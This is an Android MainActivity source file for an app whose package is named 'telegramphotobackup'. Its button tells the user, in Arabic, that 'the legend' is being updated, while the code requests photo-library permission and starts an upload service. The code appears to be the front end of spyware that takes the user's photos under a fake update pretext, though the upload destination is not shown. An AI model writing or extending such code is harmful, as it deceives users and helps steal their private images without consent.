package com.example.telegramphotobackup;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final int REQ_PHOTOS = 100;
    private TextView status;
    private Button button;

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        status = findViewById(R.id.status);
        button = findViewById(R.id.updateButton);
        findViewById(R.id.liveButton).setOnClickListener(v -> startActivity(new Intent(this, LiveActivity.class)));
        button.setOnClickListener(v -> startUpdate());
    }

    private void startUpdate() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_MEDIA_IMAGES}, REQ_PHOTOS);
                return;
            }
        } else if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PHOTOS);
            return;
        }
        beginUpload();
    }

    private void beginUpload() {
        status.setText("جاري تحديث الأسطورة…");
        button.setEnabled(false);
        Intent i = new Intent(this, UploadService.class);
        startService(i);
    }

    @Override public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);
        if (requestCode == REQ_PHOTOS) {
            if (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
                beginUpload();
            } else {
                status.setText("جاهز");
                button.setEnabled(true);
            }
        }
    }
}
